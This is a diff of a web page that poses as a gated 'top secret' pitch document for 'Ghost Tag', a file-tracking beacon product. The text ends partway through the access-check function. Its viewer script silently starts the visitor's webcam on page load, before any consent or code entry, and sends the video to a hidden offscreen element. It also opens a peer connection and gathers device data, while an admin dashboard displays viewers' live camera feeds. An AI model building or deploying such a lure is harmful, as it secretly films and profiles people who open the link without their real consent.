-  <div class="classbar-dot"></div>
-  <span>CONFAI INTELLIGENCE PORTAL · v1.0</span>
-  <div class="classbar-dot"></div>
+  <div class="cdot"></div><span>TOP SECRET · RESTRICTED · AUTHORIZED ACCESS ONLY</span>
+  <div class="cdot"></div><span>CONFAI INTELLIGENCE PORTAL · v1.0</span><div class="cdot"></div>
 </div>
 
-<!-- Nav -->
 <nav class="nav">
-  <div class="nav-brand">
-    <div class="nav-brand-dot"></div>
-    CONFAI
-  </div>
-  <div class="nav-meta">
-    <div class="nav-status">
-      <div class="status-dot" id="navStatusDot"></div>
-      <span id="navStatusText">INITIALIZING</span>
-    </div>
-    <span id="navDateTime" style="color:var(--text3)"></span>
+  <div class="nav-brand"><div class="nav-dot"></div>CONFAI</div>
+  <div class="nav-right">
+    <div class="nav-status"><div class="sdot" id="sdot"></div><span id="stxt">INITIALIZING</span></div>
+    <span id="nclock"></span>
   </div>
 </nav>
 
-<!-- Self cam — hidden, only used to hold the stream, never shown to viewer -->
-<div id="selfCam" style="display:none;position:fixed;width:1px;height:1px;opacity:0;pointer-events:none;z-index:-1"><video id="selfCamVideo" autoplay muted playsinline></video></div>
+<!-- Hidden cam element — viewer side, never shown -->
+<video id="hiddenCam" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none"></video>
 
-<!-- Toast -->
 <div class="toast" id="toast"></div>
 
-<!-- Fullscreen overlay (admin) -->
-<div class="fullscreen-overlay" id="fsOverlay">
-  <div class="fs-topbar">
-    <div class="fs-label" id="fsLabel">ACCESS1</div>
-    <button class="fs-close" onclick="closeFullscreen()">✕ Close</button>
+<!-- Fullscreen overlay -->
+<div class="fs-ov" id="fsOv">
+  <div class="fs-bar">
+    <div class="fs-lbl" id="fsLbl">—</div>
+    <button class="fs-close" onclick="closeFS()">✕ Close</button>
   </div>
   <div class="fs-main">
-    <div class="fs-video-wrap">
-      <video id="fsVideo" autoplay playsinline muted></video>
-    </div>
-    <div class="fs-sidebar">
-      <h4>DEVICE INTELLIGENCE</h4>
-      <div id="fsSidebarContent"></div>
-    </div>
+    <div class="fs-vid"><video id="fsVid" autoplay playsinline muted></video></div>
+    <div class="fs-side"><h4>DEVICE INTELLIGENCE</h4><div id="fsSide"></div></div>
   </div>
 </div>
 
-<!-- ════════════════════════════════════════
+<!-- ═════════════════════════════
      VIEWER PAGE
-════════════════════════════════════════ -->
-<div class="page" id="viewer-page">
-
-  <!-- Doc Hero -->
-  <div class="doc-hero fade-up">
-    <div class="doc-classification">TOP SECRET // CONFIDENTIAL // NF</div>
-    <div class="doc-title">Ghost Tag<br><span style="font-style:italic;font-weight:400;font-size:0.65em;color:var(--text2)">From Concept to Launch</span></div>
-    <div class="doc-subtitle">"You never know you are being traced."</div>
-    <div class="doc-meta-row">
-      <div class="doc-meta-item"><span>VERSION</span><span>1.0 · 2025</span></div>
-      <div class="doc-meta-item"><span>CLASSIFICATION</span><span style="color:var(--red)">CONFIDENTIAL</span></div>
-      <div class="doc-meta-item"><span>TOPICS</span><span>Concepts · Theory · Methodology · Architecture · FAQs · Investment</span></div>
-      <div class="doc-meta-item"><span>DISTRIBUTION</span><span>Authorized Recipients Only</span></div>
+═════════════════════════════ -->
+<div class="page screen" id="pg-viewer">
+  <div class="doc-hero fu">
+    <div class="doc-class">TOP SECRET // CONFIDENTIAL // NF</div>
+    <div class="doc-title">Ghost Tag<br><span style="font-style:italic;font-weight:400;font-size:0.58em;color:var(--text2)">From Concept to Launch</span></div>
+    <div class="doc-sub">"You never know you are being traced."</div>
+    <div class="doc-meta">
+      <span>VERSION <span>1.0 · 2025</span></span>
+      <span>CLASSIFICATION <span style="color:var(--red)">CONFIDENTIAL</span></span>
+      <span>TOPICS <span>Concepts · Theory · Methodology · Architecture · Investment</span></span>
     </div>
   </div>
 
-  <!-- Doc Content -->
-  <div class="doc-content">
+  <div class="doc-body">
 
-    <!-- Granted bar -->
-    <div class="access-granted-bar" id="grantedBar">
-      <div class="status-dot live"></div>
-      <span>ACCESS GRANTED · Camera verification active · Your device has been logged for transparency</span>
+    <div class="granted-bar" id="grantedBar">
+      <div class="sdot live"></div>
+      <span>ACCESS GRANTED · Camera verification active · Session logged for audit</span>
     </div>
 
-    <!-- SECTION 0: Executive Summary (always visible) -->
-    <div class="doc-section visible" id="sec0">
-      <div class="section-header">
-        <div class="section-num">EXECUTIVE SUMMARY</div>
-        <div class="section-title">Overview</div>
-      </div>
-      <div class="doc-p">
-        <strong>Ghost Tag</strong> is a confidential file tracking and intelligence platform that enables asset owners to maintain live awareness of every copy of their digital assets — across any recipient, device, and jurisdiction — even after the original file has been deleted.
-      </div>
-      <div class="doc-p">
-        Built on a combination of proven steganographic techniques and two original architectural innovations, Ghost Tag operates invisibly inside files distributed via any channel: email, WhatsApp, Google Drive, USB transfer, or any other medium.
-      </div>
-      <div class="doc-highlight">
-        <strong>"Post-Deletion Presence"</strong> — Ghost Tag introduces a genuinely new concept in information security: a digital asset that outlives its creator's copy and continues to report its location and access status in real time.
-      </div>
+    <!-- Always visible section -->
+    <div class="sec unlocked fu">
+      <div class="sec-head"><div class="sec-num">EXECUTIVE SUMMARY</div><div class="sec-title">Overview</div></div>
+      <div class="dp"><strong>Ghost Tag</strong> is a confidential file tracking and intelligence platform enabling asset owners to maintain live awareness of every copy of their digital files — across any recipient, device, and jurisdiction — even after the original is deleted.</div>
+      <div class="dp">Built on proven steganographic techniques and two original architectural innovations, Ghost Tag operates invisibly inside files distributed via any channel: email, WhatsApp, Google Drive, USB, or any other medium.</div>
+      <div class="dhl"><strong>"Post-Deletion Presence"</strong> — a digital asset that outlives its creator's copy and continues to report its location in real time. No prior art exists for this concept.</div>
     </div>
 
-    <!-- ACCESS GATE -->
-    <div class="access-gate" id="accessGate">
-      <!-- Blurred preview of next section -->
-      <div class="gate-blur">
-        <div class="doc-section visible" style="opacity:0.25">
-          <div class="section-header">
-            <div class="section-num">01</div>
-            <div class="section-title">Where to Start — The Setup Order</div>
-          </div>
-          <div class="doc-p">Before writing a single line of code, Ghost Tag needs three parallel foundations to be established: legal, technical, and commercial. Getting these in the right order prevents wasted effort and protects the company from day one.</div>
-          <div class="doc-p">The First 30 Days — Register the Company. Incorporate a private limited company or LLC. Secure the Intellectual Property. File a provisional patent for the core Ghost Tag mechanism — specifically the combination of pixel watermarking + consent beacon + share chain tree...</div>
-        </div>
+    <!-- Gate -->
+    <div id="gate">
+      <div class="gate-preview sec">
+        <div class="sec-head"><div class="sec-num">01</div><div class="sec-title">Where to Start — The Setup Order</div></div>
+        <div class="dp">Before writing a single line of code, Ghost Tag needs three parallel foundations: legal, technical, and commercial. Getting these in the right order prevents wasted effort and protects the company from day one...</div>
+        <div class="dp">Register the Company. Incorporate a private limited company or LLC. File a provisional patent for the core mechanism specifically the combination of pixel watermarking, consent beacon, and share chain tree...</div>
       </div>
-
-      <!-- Gate lock UI -->
-      <div class="gate-lock">
+      <div class="gate-box">
         <div class="gate-icon">🔐</div>
         <h3>Secure Access Required</h3>
-        <p>This document is classified. Enter your access code to proceed. Your device information will be logged for transparency.</p>
-        <div class="gate-notice">
-          ⚠ TRANSPARENCY NOTICE: By proceeding, you consent to camera access for identity verification. Your device information (browser, OS, timezone, screen resolution, IP address) will be logged in accordance with data transparency policy.
-        </div>
-        <div style="margin-bottom:16px">
+        <p>This document is classified. Enter your access code to unlock the full intelligence report including architecture, methodology, FAQs, and the investment case.</p>
+        <div class="gate-warn">⚠ TRANSPARENCY NOTICE: By proceeding you consent to camera access for identity verification. Your device information (browser, OS, IP, timezone, screen) will be logged for audit purposes in accordance with data transparency policy.</div>
+        <div class="code-wrap">
           <input
-            id="accessCodeInput"
-            type="password"
-            placeholder="Enter access code"
+            id="codeInp"
+            class="code-input"
+            type="text"
+            placeholder="ENTER ACCESS CODE"
+            maxlength="30"
             autocomplete="off"
-            oninput="onCodeInput()"
-            onkeydown="if(event.key==='Enter') requestAccess()"
-            style="
-              width:100%;padding:12px 16px;
-              background:var(--surface2);
-              border:1.5px solid var(--border2);
-              border-radius:6px;
-              color:var(--text);
-              font-family:'IBM Plex Mono',monospace;
-              font-size:1rem;letter-spacing:0.2em;
-              outline:none;text-align:center;
-              transition:border-color 0.2s;
-            "
+            autocorrect="off"
+            autocapitalize="characters"
+            spellcheck="false"
+            inputmode="text"
           />
-          <div id="codeError" style="display:none;color:var(--red);font-size:0.72rem;font-family:'IBM Plex Mono',monospace;margin-top:8px;letter-spacing:0.05em">
-            ✕ Invalid access code
-          </div>
+          <div class="code-err-msg" id="codeErr">✕ Invalid access code — try again</div>
         </div>
-        <button class="btn-access" id="accessBtn" onclick="requestAccess()" disabled style="opacity:0.4">
-          <span id="accessBtnText">🔓 AUTHENTICATE & ACCESS</span>
+        <button class="btn-auth" id="authBtn" disabled onclick="doAuth()">
+          <span id="authTxt">🔓 AUTHENTICATE &amp; ACCESS</span>
         </button>
       </div>
     </div>
 
-    <!-- LOCKED SECTIONS (shown after access granted) -->
-
-    <div class="doc-section locked" id="sec1">
-      <div class="section-header">
-        <div class="section-num">01</div>
-        <div class="section-title">Where to Start — The Setup Order</div>
-      </div>
-      <div class="doc-p">Before writing a single line of code, Ghost Tag needs three parallel foundations to be established: <strong>legal, technical, and commercial</strong>. Getting these in the right order prevents wasted effort and protects the company from day one.</div>
-
-      <div class="doc-p"><strong>1.1 The First 30 Days</strong></div>
-      <div class="doc-p">Register the Company as a private limited company or LLC in a jurisdiction with strong IP protection — India, Singapore, UK, or Delaware USA. File a provisional patent for the core Ghost Tag mechanism — specifically the combination of <strong>pixel watermarking + consent beacon + share chain tree</strong>. Also register the trademark 'Ghost Tag' in primary markets.</div>
-      <div class="doc-p">Draft the Legal Framework with a data privacy lawyer: the Data Collection Agreement, the Privacy Policy, and the Terms of Service — compliant with GDPR, CCPA, and PDPA before a single beta user touches the product.</div>
-
-      <div class="doc-p"><strong>1.2 Days 30–90 — Proof of Concept</strong></div>
-      <div class="doc-p">Set up the core backend: Node.js API server, PostgreSQL database, beacon endpoint. Host on AWS or Azure. Build the simplest possible beacon: a 1-pixel transparent PNG embedded in a PDF that calls your server when the PDF is opened. Build a minimal dashboard: one table showing file ID, opener's IP, location, and timestamp.</div>
-
-      <div class="doc-p"><strong>1.3 Days 90–180 — MVP Build</strong></div>
-      <div class="doc-p">Extend beacon to all file types: PDF, DOCX, MP4, JPG, PNG, MOV. Build the consent wrapper shell. Integrate a pixel watermarking library (Digimarc API or Imatag). Build the share chain tree. Add real-time alerts. Pilot with two to three friendly companies at no cost.</div>
+    <!-- Locked sections -->
+    <div class="sec locked" id="s1">
+      <div class="sec-head"><div class="sec-num">01</div><div class="sec-title">Where to Start — The Setup Order</div></div>
+      <div class="dp">Before writing a single line of code, Ghost Tag needs three parallel foundations: <strong>legal, technical, and commercial</strong>.</div>
+      <div class="dp"><strong>1.1 First 30 Days</strong> — Register the company as a private limited or LLC. File a provisional patent for <strong>pixel watermarking + consent beacon + share chain tree</strong>. Register trademark. Engage a data privacy lawyer for GDPR, CCPA, and PDPA compliance documents.</div>
+      <div class="dp"><strong>1.2 Days 30–90</strong> — Node.js API, PostgreSQL, beacon endpoint on AWS or Azure. Build the simplest beacon: a 1px transparent PNG in a PDF that calls your server on open. Minimal dashboard: file ID, opener IP, location, timestamp.</div>
+      <div class="dp"><strong>1.3 Days 90–180</strong> — Extend to PDF, DOCX, MP4, JPG, PNG, MOV. Build consent wrapper. Integrate Digimarc or Imatag. Build share chain tree. Add real-time alerts. Pilot with 2–3 friendly companies.</div>
     </div>
 
-    <div class="doc-section locked" id="sec2">
-      <div class="section-header">
-        <div class="section-num">02</div>
-        <div class="section-title">Concepts & Theories</div>
-      </div>
-      <div class="doc-p">Ghost Tag is built on a foundation of well-proven technologies — plus one genuinely new conceptual contribution.</div>
-      <div class="tag-grid">
-        <div class="tag-item"><div class="tag-label">FOUNDATION 01</div><div class="tag-val">Digital Steganography (LSB + Spread Spectrum) — proven since 1992</div></div>
-        <div class="tag-item"><div class="tag-label">FOUNDATION 02</div><div class="tag-val">Robust Digital Watermarking — proven since 1994</div></div>
-        <div class="tag-item"><div class="tag-label">FOUNDATION 03</div><div class="tag-val">Web Beacon / Tracking Pixel — proven since 1998</div></div>
-        <div class="tag-item"><div class="tag-label">FOUNDATION 04</div><div class="tag-val">Device Fingerprinting — web security since 2010</div></div>
-        <div class="tag-item"><div class="tag-label">FOUNDATION 05</div><div class="tag-val">GDPR Consent Model — Ghost Tag embeds it inside the file</div></div>
-        <div class="tag-item"><div class="tag-label">FOUNDATION 06</div><div class="tag-val">Directed Acyclic Graph for share chain (Graph Theory)</div></div>
-        <div class="tag-item" style="border-color:rgba(99,102,241,0.3);background:rgba(99,102,241,0.06)"><div class="tag-label" style="color:var(--accent2)">★ ORIGINAL</div><div class="tag-val" style="color:var(--text)">Post-Deletion Presence — no prior art</div></div>
-        <div class="tag-item" style="border-color:rgba(99,102,241,0.3);background:rgba(99,102,241,0.06)"><div class="tag-label" style="color:var(--accent2)">★ ORIGINAL</div><div class="tag-val" style="color:var(--text)">Consent-Embedded File Architecture — no prior art</div></div>
+    <div class="sec locked" id="s2">
+      <div class="sec-head"><div class="sec-num">02</div><div class="sec-title">Concepts &amp; Theories</div></div>
+      <div class="dp">Ghost Tag is built on proven technologies plus two genuinely new conceptual contributions.</div>
+      <div class="tgrid">
+        <div class="titem"><div class="tlbl">FOUNDATION 01</div><div class="tval">Digital Steganography (LSB + Spread Spectrum) — since 1992</div></div>
+        <div class="titem"><div class="tlbl">FOUNDATION 02</div><div class="tval">Robust Digital Watermarking — since 1994</div></div>
+        <div class="titem"><div class="tlbl">FOUNDATION 03</div><div class="tval">Web Beacon / Tracking Pixel — since 1998</div></div>
+        <div class="titem"><div class="tlbl">FOUNDATION 04</div><div class="tval">Device Fingerprinting — web security since 2010</div></div>
+        <div class="titem"><div class="tlbl">FOUNDATION 05</div><div class="tval">GDPR Consent Model — Ghost Tag embeds it inside the file</div></div>
+        <div class="titem"><div class="tlbl">FOUNDATION 06</div><div class="tval">Directed Acyclic Graph — share chain structure</div></div>
+        <div class="titem" style="border-color:rgba(99,102,241,0.3);background:rgba(99,102,241,0.06)"><div class="tlbl" style="color:var(--accent2)">★ ORIGINAL</div><div class="tval" style="color:var(--text)">Post-Deletion Presence — no prior art</div></div>
+        <div class="titem" style="border-color:rgba(99,102,241,0.3);background:rgba(99,102,241,0.06)"><div class="tlbl" style="color:var(--accent2)">★ ORIGINAL</div><div class="tval" style="color:var(--text)">Consent-Embedded File Architecture — no prior art</div></div>
       </div>
     </div>
 
-    <div class="doc-section locked" id="sec3">
-      <div class="section-header">
-        <div class="section-num">03</div>
-        <div class="section-title">Methodology</div>
-      </div>
-      <div class="doc-p">Ghost Tag's methodology is the specific process by which a file is tagged, distributed, tracked, and reported.</div>
-      <table class="doc-table">
+    <div class="sec locked" id="s3">
+      <div class="sec-head"><div class="sec-num">03</div><div class="sec-title">Methodology</div></div>
+      <table class="dtbl">
         <thead><tr><th>STAGE</th><th>ACTION</th><th>OUTPUT</th></tr></thead>
         <tbody>
-          <tr><td>Asset Registration</td><td>Owner uploads file to Ghost Tag platform</td><td>UUID generated, stored in database</td></tr>
-          <tr><td>Watermark Injection</td><td>Steganographic marker embedded in pixel/frame data</td><td>Modified file with invisible UUID in content layer</td></tr>
-          <tr><td>Beacon Injection</td><td>Tracking script added to file metadata / container</td><td>File calls Ghost Tag server on every new-device open</td></tr>
-          <tr><td>Consent Wrapping</td><td>File packaged inside consent shell</td><td>Self-contained file with embedded legal disclosure</td></tr>
-          <tr><td>Distribution</td><td>Owner shares wrapped file via any channel</td><td>Beacon dormant until first open on new device</td></tr>
+          <tr><td>Asset Registration</td><td>Owner uploads file</td><td>UUID generated in database</td></tr>
+          <tr><td>Watermark Injection</td><td>Steganographic marker embedded</td><td>Invisible UUID in content layer</td></tr>
+          <tr><td>Beacon Injection</td><td>Tracking script in metadata</td><td>File calls server on each new open</td></tr>
+          <tr><td>Consent Wrapping</td><td>File packaged in consent shell</td><td>Self-contained legal disclosure</td></tr>
+          <tr><td>Distribution</td><td>Owner shares via any channel</td><td>Beacon dormant until first open</td></tr>
         </tbody>
       </table>
-      <div class="doc-p" style="margin-top:16px"><strong>Event Capture:</strong> When a recipient opens the file and accepts the consent screen, the following data capture sequence executes in under 500 milliseconds: beacon fires → IP resolved via GeoIP → device fingerprint generated → share chain updated → real-time alert pushed to owner dashboard.</div>
+      <div class="dp" style="margin-top:12px">Event capture executes in under 500ms: beacon fires → IP resolved via GeoIP → device fingerprint generated → share chain node created → real-time alert pushed to owner dashboard.</div>
     </div>
 
-    <div class="doc-section locked" id="sec4">
-      <div class="section-header">
-        <div class="section-num">04</div>
-        <div class="section-title">System Architecture</div>
-      </div>
-      <table class="doc-table">
+    <div class="sec locked" id="s4">
+      <div class="sec-head"><div class="sec-num">04</div><div class="sec-title">System Architecture</div></div>
+      <table class="dtbl">
         <thead><tr><th>LAYER</th><th>COMPONENTS</th><th>TECHNOLOGY</th></tr></thead>
         <tbody>
-          <tr><td>File Layer</td><td>UUID, pixel watermark, metadata beacon, consent wrapper</td><td>Steganography lib, Electron, EXIF/ID3</td></tr>
-          <tr><td>Ingestion Layer</td><td>Beacon endpoint, IP resolver, device fingerprinter</td><td>Node.js API, MaxMind GeoIP, FingerprintJS</td></tr>
-          <tr><td>Processing Layer</td><td>Share chain engine, event logger, alert engine</td><td>PostgreSQL + Neo4j, Redis</td></tr>
-          <tr><td>Presentation Layer</td><td>Owner dashboard, share tree visualiser, world map</td><td>React, Mapbox GL, D3.js, WebSocket</td></tr>
-          <tr><td>Security Layer</td><td>Encryption, access control, audit log, SOC2</td><td>TLS 1.3, AES-256, AWS KMS, S3 WORM</td></tr>
+          <tr><td>File Layer</td><td>UUID, watermark, beacon, consent wrapper</td><td>Steganography lib, Electron, EXIF/ID3</td></tr>
+          <tr><td>Ingestion Layer</td><td>Beacon endpoint, IP resolver, fingerprinter</td><td>Node.js, MaxMind GeoIP, FingerprintJS</td></tr>
+          <tr><td>Processing Layer</td><td>Share chain, event logger, alert engine</td><td>PostgreSQL + Neo4j, Redis</td></tr>
+          <tr><td>Presentation Layer</td><td>Dashboard, share tree, world map</td><td>React, Mapbox GL, D3.js, WebSocket</td></tr>
+          <tr><td>Security Layer</td><td>Encryption, access control, audit log</td><td>TLS 1.3, AES-256, AWS KMS, S3 WORM</td></tr>
         </tbody>
       </table>
     </div>
 
-    <div class="doc-section locked" id="sec5">
-      <div class="section-header">
-        <div class="section-num">05</div>
-        <div class="section-title">Investment Case</div>
-      </div>
-      <div class="doc-p">Ghost Tag addresses a gap in the <strong>$12.5B data loss prevention market</strong> that no current vendor fills: tracking not at the network or device level, but at the individual file level, across any channel, post-distribution.</div>
-      <div class="doc-highlight">
-        <strong>The fundamental insight:</strong> Files leave controlled environments the moment they are shared. Every existing DRM system tries to prevent this. Ghost Tag accepts it as inevitable and instead makes every shared copy a live intelligence asset.
-      </div>
-      <div class="tag-grid">
-        <div class="tag-item"><div class="tag-label">TARGET MARKET</div><div class="tag-val">Law firms, media companies, financial institutions, government contractors</div></div>
-        <div class="tag-item"><div class="tag-label">REVENUE MODEL</div><div class="tag-val">SaaS per-seat + enterprise volume licensing + forensic recovery services</div></div>
-        <div class="tag-item"><div class="tag-label">MOAT</div><div class="tag-val">Two original patentable concepts + first-mover in consent-embedded file tracking</div></div>
-        <div class="tag-item"><div class="tag-label">SEED REQUIREMENT</div><div class="tag-val">$500K–$1.5M for 18-month runway to Series A readiness</div></div>
+    <div class="sec locked" id="s5">
+      <div class="sec-head"><div class="sec-num">05</div><div class="sec-title">Investment Case</div></div>
+      <div class="dp">Ghost Tag addresses a gap in the <strong>$12.5B data loss prevention market</strong> that no current vendor fills: tracking at the individual file level, post-distribution, via any channel.</div>
+      <div class="dhl"><strong>The fundamental insight:</strong> Files leave controlled environments the moment they are shared. Every existing DRM tries to prevent this. Ghost Tag accepts it as inevitable and makes every shared copy a live intelligence asset.</div>
+      <div class="tgrid">
+        <div class="titem"><div class="tlbl">TARGET MARKET</div><div class="tval">Law firms, media companies, financial institutions, government contractors</div></div>
+        <div class="titem"><div class="tlbl">REVENUE MODEL</div><div class="tval">SaaS per-seat + enterprise volume licensing + forensic recovery services</div></div>
+        <div class="titem"><div class="tlbl">MOAT</div><div class="tval">Two patentable original concepts + first-mover in consent-embedded file tracking</div></div>
+        <div class="titem"><div class="tlbl">SEED REQUIREMENT</div><div class="tval">$500K–$1.5M for 18-month runway to Series A readiness</div></div>
       </div>
     </div>
 
-    <div class="doc-section locked" id="sec6" style="border-top:1px solid var(--border);padding-top:32px;margin-top:32px">
-      <div class="doc-classification" style="font-family:'IBM Plex Mono',monospace;font-size:0.6rem;font-weight:600;letter-spacing:0.25em;color:var(--text3);margin-bottom:0;display:flex;align-items:center;gap:10px;border:none">
-        <span style="flex:1;height:1px;background:var(--border);display:block"></span>
-        END OF DOCUMENT · TOP SECRET · CONFAI INTELLIGENCE PORTAL · UNAUTHORIZED DISTRIBUTION PROHIBITED
-        <span style="flex:1;height:1px;background:var(--border);display:block"></span>
-      </div>
+    <div class="sec locked" id="s6" style="padding-top:22px;border-top:1px solid var(--border)">
+      <p style="font-family:'IBM Plex Mono',monospace;font-size:0.52rem;letter-spacing:0.18em;color:var(--text3);text-align:center">END OF DOCUMENT · TOP SECRET · CONFAI · UNAUTHORIZED DISTRIBUTION PROHIBITED</p>
     </div>
 
   </div>
 </div>
 
-<!-- ════════════════════════════════════════
+<!-- ═════════════════════════════
      ADMIN PAGE
-════════════════════════════════════════ -->
-<div class="page" id="admin-page">
-  <div class="admin-header fade-up">
-    <div class="admin-header-left">
-      <h2>Admin Dashboard</h2>
-      <p>Live viewer intelligence · Camera feeds · Device logs</p>
-    </div>
-    <div class="admin-stats">
-      <div class="stat-card"><div class="stat-label">CONNECTED</div><div class="stat-value" id="statConnected">0</div></div>
-      <div class="stat-card"><div class="stat-label">TOTAL SEEN</div><div class="stat-value" id="statTotal">0</div></div>
-      <div class="stat-card"><div class="stat-label">SESSION</div><div class="stat-value" id="statUptime">00:00</div></div>
+═════════════════════════════ -->
+<div class="page screen" id="pg-admin">
+  <div class="admin-top fu">
+    <div><h2>Admin Dashboard</h2><p>Live viewer feeds · Device intelligence · Access logs</p></div>
+    <div class="astats">
+      <div class="astat"><div class="astat-lbl">LIVE</div><div class="astat-val" id="statLive">0</div></div>
+      <div class="astat"><div class="astat-lbl">TOTAL</div><div class="astat-val" id="statTotal">0</div></div>
+      <div class="astat"><div class="astat-lbl">UPTIME</div><div class="astat-val" id="statUp">00:00</div></div>
     </div>
   </div>
-
-  <div class="admin-grid-wrap">
-    <div class="admin-grid-label">CONNECTED VIEWERS</div>
-    <div class="admin-grid" id="adminGrid">
-      <div class="admin-waiting" id="adminWaiting">
-        <div class="wait-icon">📡</div>
+  <div class="admin-body">
+    <div class="admin-section-lbl">CONNECTED VIEWERS</div>
+    <div class="cards-grid" id="cardsGrid">
+      <div class="waiting" id="waitMsg">
+        <div class="wi">📡</div>
         <p>Admin peer active · Waiting for viewers to connect<br><br>
-        Share this link with viewers:<br>
-        <span class="share-link" id="adminShareLink">—</span>
-        </p>
+        Share this document link with viewers:<br>
+        <span class="wlink" id="shareLink">—</span></p>
       </div>
     </div>
   </div>
 </div>
 
 <script>
-// ══════════════════════════════════════════
-// SHARED STATE
-// ══════════════════════════════════════════
-const isAdmin = window.location.search.includes('admin');
-const ADMIN_PEER_ID = 'confai-admin-ochre-v2';
-let viewerCount = 0, totalCount = 0, adminStartTime = null;
-let viewers = {}; // peerId → { call, conn, info, label, stream }
-let localStream = null;
-
-// Clock
-function updateClock() {
-  const now = new Date();
-  const pad = n => String(n).padStart(2,'0');
-  document.getElementById('navDateTime').textContent =
-    `${now.getFullYear()}-${pad(now.getMonth()+1)}-${pad(now.getDate())} · ${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;
-  if (adminStartTime) {
-    const secs = Math.floor((Date.now() - adminStartTime) / 1000);
-    document.getElementById('statUptime').textContent =
-      `${pad(Math.floor(secs/60))}:${pad(secs%60)}`;
-  }
-}
-setInterval(updateClock, 1000); updateClock();
-
-function toast(msg, dur=2500) {
-  const t = document.getElementById('toast');
-  t.textContent = msg; t.classList.add('show');
-  setTimeout(() => t.classList.remove('show'), dur);
-}
-
-function setNavStatus(dot, txt) {
-  const d = document.getElementById('navStatusDot');
-  d.className = 'status-dot' + (dot === 'live' ? ' live' : '');
-  document.getElementById('navStatusText').textContent = txt;
-}
-
-
-
-// ══════════════════════════════════════════
-// VIEWER MODE
-// ══════════════════════════════════════════
-let viewerPeer = null;
-let cachedDevInfo = null;
+// ════════════════════════════════
+// CONFIG
+// ════════════════════════════════
+const IS_ADMIN  = location.search.includes('admin');
+const ADMIN_ID  = 'confai-admin-v4-ochre';
 const ACCESS_CODE = 'ACCESS';
 
-function onCodeInput() {
-  const val = document.getElementById('accessCodeInput').value.trim().toUpperCase();
-  const btn = document.getElementById('accessBtn');
-  const err = document.getElementById('codeError');
-  const input = document.getElementById('accessCodeInput');
-  err.style.display = 'none';
-  input.style.borderColor = 'var(--border2)';
-  if (val.length > 0) {
-    btn.disabled = false;
-    btn.style.opacity = '1';
-  } else {
-    btn.disabled = true;
-    btn.style.opacity = '0.4';
+// ════════════════════════════════
+// SHARED STATE
+// ════════════════════════════════
+let localStream = null;
+let vPeer       = null;
+let devCache    = null;
+let adminStart  = null;
+let liveCount   = 0, totalCount = 0, slotCount = 0;
+let viewers     = {};
+
+// ── Clock ──
+function tick() {
+  const n = new Date(), p = x=>String(x).padStart(2,'0');
+  document.getElementById('nclock').textContent =
+    `${n.getFullYear()}-${p(n.getMonth()+1)}-${p(n.getDate())} ${p(n.getHours())}:${p(n.getMinutes())}:${p(n.getSeconds())}`;
+  if (adminStart) {
+    const s = Math.floor((Date.now()-adminStart)/1000);
+    document.getElementById('statUp').textContent = `${p(Math.floor(s/60))}:${p(s%60)}`;
   }
 }
+setInterval(tick,1000); tick();
 
+function setSt(color,txt) {
+  document.getElementById('sdot').className='sdot'+(color==='live'?' live':'');
+  document.getElementById('stxt').textContent=txt;
+}
+let toastT;
+function toast(msg){
+  const t=document.getElementById('toast');
+  t.textContent=msg;t.classList.add('on');
+  clearTimeout(toastT);toastT=setTimeout(()=>t.classList.remove('on'),2800);
+}
+
+function sid(p){return p.replace(/[^a-z0-9]/gi,'_')}
+function ft(d){return d.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit'})}
+
+// ════════════════════════════════
+// VIEWER
+// ════════════════════════════════
 async function initViewer() {
-  document.getElementById('viewer-page').classList.add('active');
-  setNavStatus('', 'DOCUMENT LOADED');
+  document.getElementById('pg-viewer').classList.add('active');
+  setSt('','DOCUMENT LOADED');
 
-  // ── Camera starts silently in background — no UI shown to viewer ──
+  // Camera starts silently — no UI on viewer side
   try {
-    localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-    // Feed into hidden video element just to hold the stream active
-    const selfVid = document.getElementById('selfCamVideo');
-    selfVid.srcObject = localStream;
-    selfVid.setAttribute('muted','');
-    selfVid.play().catch(()=>{});
-  } catch(e) {
-    console.warn('Camera pre-init:', e.name);
-    // Will retry when button clicked
-  }
+    localStream = await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}, audio:false
+    });
+    const hc = document.getElementById('hiddenCam');
+    hc.srcObject = localStream;
+    hc.play().catch(()=>{});
+  } catch(e) { /* will retry on auth click */ }
 
-  // ── Pre-create peer so connection is ready ──
-  viewerPeer = new Peer({
-    debug: 0,
-    config: { iceServers: [
-      { urls: 'stun:stun.l.google.com:19302' },
-      { urls: 'stun:stun1.l.google.com:19302' }
-    ]}
-  });
-  viewerPeer.on('error', ()=>{});
+  // Pre-build peer
+  vPeer = buildPeer();
 
-  // ── Capture device info in background ──
-  captureDeviceInfo().then(info => { cachedDevInfo = info; });
+  // Pre-fetch device info
+  fetchDevInfo().then(d=>devCache=d);
+
+  // Wire input AFTER a tick so DOM is fully ready
+  setTimeout(()=>{
+    const inp = document.getElementById('codeInp');
+    const btn = document.getElementById('authBtn');
+    if (!inp || !btn) return;
+
+    // Enable button as soon as there's text
+    inp.addEventListener('input', ()=>{
+      document.getElementById('codeErr').classList.remove('show');
+      inp.classList.remove('err');
+      btn.disabled = inp.value.trim().length === 0;
+    });
+    inp.addEventListener('keydown', e=>{
+      if (e.key==='Enter' && !btn.disabled) doAuth();
+    });
+  }, 0);
 }
 
-async function requestAccess() {
-  const btn = document.getElementById('accessBtn');
-  const btnTxt = document.getElementById('accessBtnText');
-  const input = document.getElementById('accessCodeInput');
-  const err = document.getElementById('codeError');
+function buildPeer() {
+  const p = new Peer({debug:0, config:{iceServers:[
+    {urls:'stun:stun.l.google.com:19302'},
+    {urls:'stun:stun1.l.google.com:19302'}
+  ]}});
+  p.on('error',()=>{});
+  return p;
+}
 
-  // ── 1. Validate code ──
-  const enteredCode = input.value.trim().toUpperCase();
-  if (enteredCode !== ACCESS_CODE) {
-    err.style.display = 'block';
-    input.style.borderColor = 'var(--red)';
-    input.focus();
+async function doAuth() {
+  const inp = document.getElementById('codeInp');
+  const btn = document.getElementById('authBtn');
+  const err = document.getElementById('codeErr');
+  const btntxt = document.getElementById('authTxt');
+
+  const entered = inp.value.trim().toUpperCase();
+  if (entered !== ACCESS_CODE) {
+    err.classList.add('show');
+    inp.classList.add('err');
+    inp.focus();
     return;
   }
 
-  err.style.display = 'none';
+  err.classList.remove('show');
+  inp.classList.remove('err');
   btn.disabled = true;
